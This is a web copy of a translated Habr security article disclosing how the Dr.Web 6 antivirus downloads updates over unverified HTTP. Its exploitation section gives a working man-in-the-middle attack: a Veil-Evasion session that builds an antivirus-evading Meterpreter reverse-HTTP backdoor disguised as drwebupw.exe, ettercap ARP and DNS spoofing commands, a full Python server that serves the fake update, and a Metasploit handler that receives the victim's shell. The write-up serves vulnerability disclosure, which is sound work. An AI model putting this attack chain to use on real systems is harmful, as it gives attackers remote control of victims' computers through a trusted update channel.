<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Exploitation of vulnerability in DrWeb update procedure</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In this article, I want to tell you more about the problems of the update protocol in Dr.Web anti-virus, thanks to which, in case of interception of t...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Exploitation of vulnerability in DrWeb update procedure</h1><div class="post__text post__text-html js-mediator-article">  In this article, I want to tell you more about the problems of the update protocol in Dr.Web anti-virus, thanks to which, in case of interception of traffic, it becomes possible to replace anti-virus components and execute arbitrary code.  I first saw information about the vulnerability in the materials of the <a href="http://www.syscan.org/">SyScan2014</a> conference in the presentation <a href="http://mincore.c9x.org/breaking_av_software.pdf">Breaking Antivirus Software</a> (Joxean Koret), and so on.  the fact of vulnerability is already known, then there was not much point in another publication.  At least until one moment. <br><br>  In discussing the article ‚Äú <a href="http://habrahabr.ru/post/219691/">Data of about 70,000 cards were compromised at the Russian Railways payment gateway,</a> ‚Äù I was genuinely surprised by the reaction of some readers, and allegedly by a member of Dr.Web, who refused to admit that there were problems in the software.  Therefore, it was decided to sort out the details myself, and also to check the possibility of exploitation.  I hope this publication will contribute to the earliest possible rectification of the situation. <br><a name="habracut"></a><br><h5>  Initial data: </h5><br>  Dr.Web version 6.0 was selected as the ‚Äútest subject‚Äù as having multiple certificates: FSTEC, FSB, and the Ministry of Defense of the Russian Federation.  The remaining versions were not considered, so perhaps they have similar problems, and perhaps not.  During the experiment, all the antivirus settings are set by default, the built-in protection was NOT disabled.  The operating system uses Windows 7. <br><br><div class="spoiler">  <b class="spoiler_title">A detailed list of antivirus software modules and their versions at the time of testing</b> <div class="spoiler_text"><ul><li>  Dr.Web ¬Æ Virus-Finding Engine drweb32.dll (7.00.9.04080) </li><li>  Dr.Web ¬Æ Scanning Engine dwengine.exe (7.0.1.05020 (Build 9393)) </li><li>  Dr.Web ¬Æ Windows Action Center Integration dwsewsc.exe (7.0.1.05020 (Build 9393)) </li><li>  Dr.Web File System Monitor spiderg3.sys (6.0.10.12290) </li><li>  Dr.Web Protection for Windows dwprot.sys (7.0.0.08090) </li><li>  SpIDer Agent for Windows spideragent.exe (6.0.5.10310) </li><li>  SpIDer Agent admin-mode module for Windows spideragent_adm.exe (6.0.5.10310) </li><li>  SpIDer Agent settings module for Windows spideragent_set.exe (6.0.5.10310) </li><li>  SpIDer Mail ¬Æ for Windows Workstation spiderml.exe (6.0.3.08040) </li><li>  SpIDer Mail ¬Æ for Windows Workstation settings module spml_set.exe (6.0.3.08040) </li><li>  Dr.Web Winsock Provider Hook drwebsp.dll (6.0.1.04140) </li><li>  Dr.Web Winsock Provider Hook drwebsp64.dll (6.0.1.04140) </li><li>  Dr.Web ¬© Scanner for Windows drweb32w.exe (6.00.16.01270) </li><li>  Dr.Web ¬Æ Console Scanner dwscancl.exe (7.0.1.05020 (Build 9393)) </li><li>  Dr.Web ¬Æ Shell Extension drwsxtn.dll (6.00.1.201103100) </li><li>  Dr.Web ¬Æ Shell Extension drwsxtn64.dll (6.00.1.201103100) </li><li>  Dr.Web Updater for Windows drwebupw.exe (06.00.15.201301210) </li><li>  Dr.Web Helper drwreg.exe (6.00.12.201102110) </li><li>  Dr.Web SysInfo dwsysinfo.exe (7.00.3.201204270) </li><li>  DrWeb ¬Æ Quarantine Manager dwqrui.exe (7.0.1.05020 (Build 9393)) </li><li>  Dr.Web Adds-on unpacker drwadins.exe (6.00.0.02270) </li><li>  Dr.Web ¬Æ for Microsoft Outlook Settings drwebsettingprocess.exe (6.00.0.201101130) </li><li>  Dr.Web ¬Æ for Microsoft Outlook Messages drwmsg.dll (6.00.0.201101130) </li><li>  Dr.Web ¬Æ for Microsoft Outlook drwebforoutlook.dll (6.00.0.201101130) </li></ul><br></div></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      To exploit the vulnerability, it is necessary for an attacker to have the ability to redirect user traffic (for example, due to a DNS server spoofing, ARP cache poisoning, or something else).  For the sake of simplicity, in a test environment, the computers of the client and the attacker are on the same network: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/b91/c05/430/b91c054308f5ba0515b823f2a115078c.png"></div><br><h5>  Vulnerability description </h5><br>  To download updates from their servers, Dr.Web uses the http protocol, i.e.  data is transmitted in clear text. <br><div class="spoiler">  <b class="spoiler_title">List of update servers</b> <div class="spoiler_text"><ul><li>  update.geo.drweb.com </li><li>  update.drweb.com </li><li>  update.msk.drweb.com </li><li>  update.us.drweb.com </li><li>  update.msk5.drweb.com </li><li>  update.msk6.drweb.com </li><li>  update.fr1.drweb.com </li><li>  update.us1.drweb.com </li><li>  update.kz.drweb.com </li><li>  update.nsk1.drweb.com </li></ul><br></div></div><br>  The process is performed in the following sequence: <br><ol><li>  <b>Request Timestamp - timestamp</b> <br><div class="spoiler">  <b class="spoiler_title">Request example</b> <div class="spoiler_text">  GET / x64 / 600 / av / windows / timestamp <br>  HTTP / 1.1 Accept: * / * <br>  Host: update.drweb.com <br>  X-DrWeb-Validate: 259e9b92fa099939d198dbd82c106f95 <br>  X-DrWeb-KeyNumber: 0110258647 <br>  X-DrWeb-SysHash: E2E8203CB505AE00939EEC9C1D58D0E4 <br>  User-Agent: DrWebUpdate-6.00.15.06220 (windows: 6.01.7601) <br>  Connection: Keep-Alive <br>  Cache-Control: no-cache <br><br>  HTTP / 1.1 200 OK <br>  Server: nginx / 42 Date: Sat, 19 Apr 2014 10:33:36 GMT <br>  Content-Type: application / octet-stream <br>  Content-Length: 10 <br>  Last-Modified: Sat, Apr 19 2014 09:26:19 GMT <br>  Connection: keep-alive <br>  Accept-Ranges: bytes <br><br>  1397898695 <br></div></div><br></li><li>  <b>Request additional information (the current version of the anti-virus and some other data) - the drweb32.flg file</b> <br><div class="spoiler">  <b class="spoiler_title">Request example</b> <div class="spoiler_text">  GET /x64/600/av/windows/drweb32.flg HTTP / 1.1 <br>  Accept: * / * <br>  Host: update.drweb.com <br>  X-DrWeb-Validate: 259e9b92fa099939d198dbd82c106f95 <br>  X-DrWeb-KeyNumber: 0110258647 <br>  X-DrWeb-SysHash: E2E8203CB505AE00939EEC9C1D58D0E4 <br>  User-Agent: DrWebUpdate-6.00.15.06220 (windows: 6.01.7601) <br>  Connection: Keep-Alive <br>  Cache-Control: no-cache <br><br>  HTTP / 1.1 200 OK <br>  Server: nginx / 42 Date: Sat, 19 Apr 2014 10:33:37 GMT <br>  Content-Type: application / octet-stream <br>  Content-Length: 336 Last-Modified: Wed, 23 Jan 2013 09:42:21 GMT <br>  Connection: keep-alive <br>  Accept-Ranges: bytes [windows] <br><br>  LinkNews = http: //news.drweb.com/flag+800/ <br>  LinkDownload = http: //download.geo.drweb.com/pub/drweb/windows/8.0/drweb-800-win.exe <br>  FileName = <br>  isTime = 1 <br>  TimeX = 1420122293 <br>  cmdLine = <br>  Type = 1 <br>  ExcludeOS = 2k | xp64 <br>  ExcludeDwl = ja <br>  ExcludeLCID = 17 | 1041 <br>  [signature] <br>  sign = 7077D2333EA900BCF30E479818E53447CA388597B3AC20B7B0471225FDE69066E8AC4C291F364077 <br></div></div><br></li><li>  <b>Request for a list of updated system components - drweb32.lst.lzma file</b> <br><div class="spoiler">  <b class="spoiler_title">Request example</b> <div class="spoiler_text">  GET /x64/600/av/windows/drweb32.lst.lzma HTTP / 1.1 <br>  Accept: * / * <br>  Host: update.drweb.com <br>  X-DrWeb-Validate: 259e9b92fa099939d198dbd82c106f95 <br>  X-DrWeb-KeyNumber: 0110258647 <br>  X-DrWeb-SysHash: E2E8203CB505AE00939EEC9C1D58D0E4 <br>  User-Agent: DrWebUpdate-6.00.15.06220 (windows: 6.01.7601) <br>  Connection: Keep-Alive Cache-Control: no-cache <br><br>  HTTP / 1.1 200 OK <br>  Server: nginx / 42 <br>  Date: Sat, 19 Apr 2014 10:33:39 GMT <br>  Content-Type: application / octet-stream <br>  Content-Length: 2373 <br>  Last-Modified: Sat, 19 Apr 2014 10:23:08 GMT <br>  Connection: keep-alive <br>  Accept-Ranges: bytes <br><br>  ] ..... # .......-. <br>  ..x.3..x.  . ** .. C ....... d ... X..7..vB. * P] c ... &lt;.... ^.,. 2..c.?.&gt; Y ....!. (, .. * ... sA.U.pM .., ....... hG .... j. * ............. F ...: ... ..! Z ..... h ..} ... (Y1k .....} ... F ..-.... J ........ ....... | ... 3.; ..... 5 .. "... SK`.) <br>  .Kjx $, .... u.5 .. ~.} UX.E ... (other data omitted) <br></div></div><br>  The requested file is an archive compressed using the lzma algorithm (used in 7-Zip).  After unpacking, the file itself looks like this: <br><pre><code class="bash hljs">[DrWebUpdateList] [500] +timestamp, 8D17F12F +lang.lst, EDCB0715 +update.drl, AB6FA8BE +drwebupw.exe, 8C879982 +drweb32.dll, B73749FD +drwebase.vdb, C5CBA22F ‚Ä¶ +&lt;wnt&gt;%SYSDIR64%\drivers\dwprot.sys, 3143EB8D +&lt;wnt&gt;%CommonProgramFiles%\Doctor Web\Scanning Engine\dwengine.exe, 8097D92B +&lt;wnt&gt;%CommonProgramFiles%\Doctor Web\Scanning Engine\dwinctl.dll, A18AEA4A ... [DrWebUpdateListEnd]</code> </pre> <br>  The hexadecimal values ‚Äã‚Äãnext to the file names are the checksums of the files, calculated using the crc32 algorithm.  In this case, checksums are used to maintain the versioning of files. <br>  You can also see that the update mechanism can use environment variables like% CommonProgramFiles%,% SYSDIR64%, etc.  - <b>i.e.</b>  <b>files can be uploaded not only to the Dr.Web folder, but also other system directories</b> <br><br></li><li>  <b>File download</b> <br><div class="spoiler">  <b class="spoiler_title">Request example</b> <div class="spoiler_text">  GET /x86/600/av/windows/dwrtoday.vdb HTTP / 1.1 <br>  Accept: * / * <br>  Host: update.drweb.com <br>  X-DrWeb-Validate: 741d1186c47dc500ab5a60629579d8cf <br>  X-DrWeb-KeyNumber: 0110242389 <br>  X-DrWeb-SysHash: 08AA5F775FD38D161E2221928D10903F <br>  User-Agent: DrWebUpdate-6.00.15.06220 (windows: 6.01.7600) <br>  Connection: Keep-Alive <br>  Cache-Control: no-cache <br><br>  HTTP / 1.1 200 OK <br>  Server: nginx / 42 <br>  Date: Sat, 19 Apr 2014 02:02:36 GMT <br>  Content-Type: application / octet-stream <br>  Content-Length: 5712 <br>  Last-Modified: Sat, 19 Apr 2014 01:31:32 GMT <br>  Connection: keep-alive <br>  Accept-Ranges: bytes <br><br>  Dr.Web ¬Æ version 4.20+ Anti-Virus Database <br>  Copyright ¬© by Igor Daniloff, 1998-2014 <br>  Created by Doctor Web Anti-Virus Labs, St. Petersburg <br>  IDRW4 ... CR / .U .._. C..9G. ~ \ J .... 6G ....} u ... y $ _naykP ... x ......... ..h ... ................ J ..... QS ................ 7 .. (other data omitted ) <br></div></div><br>  In that case, if the checksums of the files from the received list of updates differ from those used, the client requests a patch of the existing one: <br><pre> <code class="bash hljs">GET /x64/600/av/windows/drwebupw.exe.patch_8c879982_fd933b5f</code> </pre><br>  If the patch cannot be obtained or the file was not previously in the system, then the whole file is requested: <br><pre> <code class="bash hljs">GET /x64/600/av/windows/drwebupw.exe</code> </pre><br>  The updated files also go without any checks, in open form, or simply packed lzma. <br><br></li><li>  <b>Update files</b> <br>  After the process of downloading files, replacing old ones.  In this case, additional checks are also not performed.  For example, as will be shown later, Dr.Web accepted the generated payload from the meta-exploit instead of the native drwebupw.exe without any problems. <br></li></ol><br>  On this, in principle, everything.  As you can see, there are no checks for the originality of the update, and you can try a MitM attack and replace the files with your own. <br><br><h5>  Exploitation </h5><br><ol><li>  We create our own backdoor, which would run on the client computer and transfer control to the attacker.  To do this, you can use the Meterpreter load from the Metasploit Framework project, additionally running through <a href="https://www.veil-framework.com/framework/veil-evasion">Veil-Evasion</a> to bypass the antivirus.  At the output, we get the drwebupw.exe file, which will later replace the original client antivirus component during the update. <br><div class="spoiler">  <b class="spoiler_title">Backdoor creation process (c / meterpreter / rev_http)</b> <div class="spoiler_text"><pre> <code class="bash hljs">========================================================================= Veil-Evasion | [Version]: 2.7.0 ========================================================================= [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework ========================================================================= Main Menu 29 payloads loaded Available commands: use use a specific payload info information on a specific payload list list available payloads update update Veil to the latest version clean clean out payload folders checkvt check payload hashes vs. VirusTotal <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> Veil [&gt;] Please enter a <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>: list [*] Available payloads: 1) auxiliary/coldwar_wrapper 2) auxiliary/pyinstaller_wrapper 3) c/meterpreter/rev_http 4) c/meterpreter/rev_http_service 5) c/meterpreter/rev_tcp 6) c/meterpreter/rev_tcp_service 7) c/shellcode_inject/virtual 8) c/shellcode_inject/void 9) cs/meterpreter/rev_tcp 10) cs/shellcode_inject/base64_substitution 11) cs/shellcode_inject/virtual 12) native/Hyperion 13) native/backdoor_factory 14) native/pe_scrambler 15) powershell/shellcode_inject/download_virtual 16) powershell/shellcode_inject/psexec_virtual 17) powershell/shellcode_inject/virtual 18) python/meterpreter/rev_http 19) python/meterpreter/rev_http_contained 20) python/meterpreter/rev_https 21) python/meterpreter/rev_https_contained 22) python/meterpreter/rev_tcp 23) python/shellcode_inject/aes_encrypt 24) python/shellcode_inject/arc_encrypt 25) python/shellcode_inject/base64_substitution 26) python/shellcode_inject/des_encrypt 27) python/shellcode_inject/flat 28) python/shellcode_inject/letter_substitution 29) python/shellcode_inject/pidinject [&gt;] Please enter a <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>: use 3 [&gt;] Please enter a <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>: <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> LHOST 10.0.1.106 [&gt;] Please enter a <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>: generate [&gt;] Please enter the base name <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> output files: drwebupw [*] Executable written to: /root/veil-output/compiled/drwebupw.exe</code> </pre></div></div><br><br></li><li>  Using arp-spoofing, we redirect client requests to the attacker's host.  You can use the ettercap utility and the dns_spoof module as a tool.  Add the hosts used to update Dr.Web to the ettercap redirection list.  In principle, one update.geo.drweb.com address is enough (since it is checked first): <br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ‚Äúupdate.geo.drweb.com A 10.0.1.106‚Äù &gt;&gt; /etc/ettercap/etter.dns</code> </pre><br>  Next, we launch directly the procedure of poisoning the arp-cache and replacing dns: <br><pre> <code class="bash hljs">ettercap -i eth0 -T -P dns_spoof -M arp:remote /10.0.1.1/ /10.0.1.102/</code> </pre><br>  Thus, the traffic after operation will follow the following scheme: <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/bd0/e15/1c6/bd0e151c632ff67d436b90aac826c1cc.png"></div><br></li><li>  We emulate the Dr.Web update server to issue a specially prepared file to the client.  For this, a small python script was written, which: <br><ol><li>  Accepts incoming connection </li><li>  Generates a timestamp and responds to the timestamp request </li><li>  Generates a file with additional information drweb32.flg </li><li>  Generates a file with a list of updates and packs it into the lzma archive drweb32.lst.lzma </li><li>  Gives fake update to client request </li></ol><br><div class="spoiler">  <b class="spoiler_title">drweb_http_server.py</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python #encoding: utf-8 import SocketServer import SimpleHTTPServer import time import lzma import os import binascii from struct import * from subprocess import call #  http    Dr.Web class HttpRequestHandler (SimpleHTTPServer.SimpleHTTPRequestHandler): def do_GET(self): if 'timestamp' in self.path: self.send_response(200) self.end_headers() self.wfile.write(open('timestamp').read()) elif 'drweb32.flg' in self.path: self.send_response(200) self.end_headers() self.wfile.write(open('drweb32.flg').read()) elif 'drweb32.lst.lzma' in self.path: self.send_response(200) self.end_headers() self.wfile.write(open('drweb32.lst.lzma').read()) elif UPLOAD_FILENAME + '.lzma' in self.path: self.send_response(200) self.end_headers() self.wfile.write(open(UPLOAD_FILENAME + '.lzma').read()) #      , #     -    elif UPLOAD_FILENAME + '.patch' in self.path: self.send_response(404) self.end_headers() else: print self.path def CRC32_from_file(filename): buf = open(filename,'rb').read() buf = (binascii.crc32(buf) &amp; 0xFFFFFFFF) return "%08X" % buf def create_timestamp_file(): with open('timestamp','w') as f: f.write('%s'%int(time.time())) def create_lst_file(upload_filename,upload_path): # upload_path  : #  ,         Dr.Web #    &lt;wnt&gt;%SYSDIR64%\drivers\, &lt;wnt&gt;%CommonProgramFiles%\Doctor Web\Scanning Engine\  .. crc32 = CRC32_from_file(upload_filename) with open('drweb32.lst','w') as f: f.write('[DrWebUpdateList]\n') f.write('[500]\n') f.write('+%s, %s\n' % (upload_path+upload_filename,crc32)) f.write('[DrWebUpdateListEnd]\n') # -    Linux  lzma         #   Dr.Web   ,    def edit_file_size(lzma_filename,orig_filename): file_size = os.stat(orig_filename).st_size with open(lzma_filename,'r+b') as f: f.seek(5) bsize = pack('l',file_size) f.write(bsize) #         UPLOAD_FILENAME = 'drwebupw.exe' #   create_timestamp_file() #     ,    lzma    create_lst_file(UPLOAD_FILENAME,'') call(['lzma', '-k', '-f','drweb32.lst']) edit_file_size('drweb32.lst.lzma','drweb32.lst') #     call(['lzma', '-k', '-f',UPLOAD_FILENAME]) edit_file_size(UPLOAD_FILENAME + '.lzma',UPLOAD_FILENAME) print 'Http Server started...' httpServer=SocketServer.TCPServer(('',80),HttpRequestHandler) httpServer.serve_forever()</span></span></code> </pre><br></div></div><br>  When launched, the script will start accepting connections and in response to the update request will issue a fake update for the drwebupw.exe file. <br><pre> <code class="bash hljs">python drweb_http_server.py Http Server started... 10.0.1.102 - - [20/Apr/2014 10:48:24] <span class="hljs-string"><span class="hljs-string">"GET /x64/600/av/windows/timestamp HTTP/1.1"</span></span> 200 - 10.0.1.102 - - [20/Apr/2014 10:48:24] <span class="hljs-string"><span class="hljs-string">"GET /x64/600/av/windows/drweb32.flg HTTP/1.1"</span></span> 200 - 10.0.1.102 - - [20/Apr/2014 10:48:26] <span class="hljs-string"><span class="hljs-string">"GET /x64/600/av/windows/drweb32.lst.lzma HTTP/1.1"</span></span> 200 - 10.0.1.102 - - [20/Apr/2014 10:48:27] <span class="hljs-string"><span class="hljs-string">"GET /x64/600/av/windows/drwebupw.exe.patch_8c879982_fd933b5f HTTP/1.1"</span></span> 404 - 10.0.1.102 - - [20/Apr/2014 10:48:27] <span class="hljs-string"><span class="hljs-string">"GET /x64/600/av/windows/drwebupw.exe.lzma HTTP/1.1"</span></span> 200 ‚Äì</code> </pre><br>  The client will successfully accept and overwrite the original component: <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/e88/c0d/dde/e88c0ddde51478b607fdd43237d42816.png"></div><br></li><li>  We start the connection handler from the backdoor: <br><pre> <code class="bash hljs">$ msfconsole msf &gt; use exploit/multi/handler msf exploit(handler) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> PAYLOAD windows/meterpreter/reverse_http PAYLOAD =&gt; windows/meterpreter/reverse_http msf exploit(handler) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> LHOST 10.0.1.106 LHOST =&gt; 10.0.1.106 msf exploit(handler) &gt; <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> LPORT 8080 LPORT =&gt; 8080 msf exploit(handler) &gt; run [*] Started HTTP reverse handler on http://10.0.1.106:8080/ [*] Starting the payload handler...</code> </pre><br><br>  If everything went well, then the next time you try to upgrade, a connection will come from the client: <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/7a2/758/268/7a27582683de0dea64b39da8777bb45f.png"></div><br>  On this we can assume that the client's host is compromised - we have access to the file system, the ability to execute any commands, etc.  It was possible to act not so clumsy, but only to change a certain functionality of the antivirus and thus remain imperceptible for a longer time. <br></li></ol><br><br><h5>  findings </h5><br>  As was shown above, vulnerability in Dr.Web 6 is indeed present and such attacks can be easily implemented in combat conditions.  So it remains to hope for a sober look of the developer.  I will not write about the real uselessness of certification, it has already been discussed more than once. </div><p>Source: <a href="https://habr.com/ru/post/220113/">https://habr.com/ru/post/220113/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../220095/index.html">OpenWorm: a digital model of a nematode worm in the browser</a></li>
<li><a href="../220097/index.html">Python-digest # 23. News, interesting projects, articles and interviews [April 13, 2014 - April 20, 2014]</a></li>
<li><a href="../220103/index.html">History of portable game consoles. Part 1 (Until 2000)</a></li>
<li><a href="../220107/index.html">Quixter's new Pay-By-Palm biometric electronic payment technology scans the veins of your palms.</a></li>
<li><a href="../220111/index.html">Writing a DLL for Metastock from scratch. Part 3</a></li>
<li><a href="../220115/index.html">Maketon Nova Base - a marathon for assembling a 3D printer</a></li>
<li><a href="../220117/index.html">Embarcadero RAD studio XE6</a></li>
<li><a href="../220119/index.html">Kirill Safonov: ‚ÄúIt's like racing on the ocean on small yachts‚Äù</a></li>
<li><a href="../220123/index.html">Internet radio with a host of leading from different cities and calls live</a></li>
<li><a href="../220125/index.html">Basics of parsing with Python + lxml</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>